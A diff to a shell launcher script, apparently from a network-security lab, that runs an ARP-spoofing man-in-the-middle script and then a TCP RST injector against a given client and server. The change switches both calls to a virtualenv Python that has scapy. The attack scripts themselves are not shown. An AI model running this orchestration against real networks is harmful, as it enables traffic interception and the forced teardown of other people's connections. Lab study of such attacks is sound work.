@@ -19,6 +19,11 @@ REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
 ARP_PY="$REPO_ROOT/attacker/arp_spoof.py"
 RST_PY="$REPO_ROOT/attacker/rst_attack.py"
 
+# Use the venv interpreter (scapy lives there). Under sudo, `python3` would be
+# the system interpreter and would NOT see the venv, so call it explicitly.
+PY="$SCRIPT_DIR/venv/bin/python"
+[ -x "$PY" ] || PY="$(command -v python3)"
+
 SERVER=""; CLIENT=""; IFACE=""; PORT="9000"; EXTRA=()
 while [ $# -gt 0 ]; do
     case "$1" in
@@ -53,7 +58,7 @@ cleanup() {
 trap cleanup EXIT INT TERM
 
 echo "[attack] starting ARP poisoning (MITM) ..."
-python3 "$ARP_PY" --client "$CLIENT" --server "$SERVER" -i "$IFACE" &
+"$PY" "$ARP_PY" --client "$CLIENT" --server "$SERVER" -i "$IFACE" &
 ARP_PID=$!
 
 echo "[attack] waiting 4s for ARP poisoning + MITM to settle ..."
@@ -61,7 +66,7 @@ sleep 4
 
 echo "[attack] launching RST injector ..."
 if [ "${#EXTRA[@]}" -gt 0 ]; then
-    python3 "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE" "${EXTRA[@]}"
+    "$PY" "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE" "${EXTRA[@]}"
 else
-    python3 "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE"
+    "$PY" "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE"
 fi
